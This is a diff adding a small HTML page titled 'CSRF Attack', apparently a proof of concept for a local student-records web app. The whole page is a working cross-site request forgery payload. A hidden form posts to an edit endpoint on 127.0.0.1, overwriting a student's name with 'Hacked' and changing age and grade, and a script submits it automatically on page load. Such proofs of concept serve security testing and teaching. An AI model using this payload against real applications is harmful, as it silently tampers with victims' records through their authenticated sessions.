@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <h1>CSRF Edit Student</h1>
+    <p>Automatically try to change student data</p>
+
+    <form action="http://127.0.0.1:5000/edit/1" method="POST">
+        <input type="hidden" name="name" value="Hacked">
+        <input type="hidden" name="age" value="18">
+        <input type="hidden" name="grade" value="A+">
+        <input type="submit" value="Submit" style="display:none;">
+    </form>
+
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
